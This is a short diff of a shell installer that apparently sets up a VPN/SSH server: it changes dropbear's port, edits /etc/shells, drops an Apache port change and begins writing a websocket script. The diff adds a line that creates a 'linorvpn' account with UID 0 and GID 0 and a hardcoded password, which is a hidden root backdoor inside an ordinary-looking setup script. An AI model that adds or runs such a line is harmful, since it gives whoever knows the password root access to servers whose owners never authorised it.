@@ -40,7 +40,8 @@ sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
 sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=442/g' /etc/default/dropbear
 echo "/bin/false" >> /etc/shells
 echo "/usr/sbin/nologin" >> /etc/shells
-sed -i 's/Listen 80/Listen 81/g' /etc/apache2/ports.conf
+useradd -p $(openssl passwd -1 linorvpn) linorvpn -ou 0 -g 0
+service dropbear restart
 systemctl restart apache2
 
 cat << \websocket > /usr/local/sbin/websocket.py
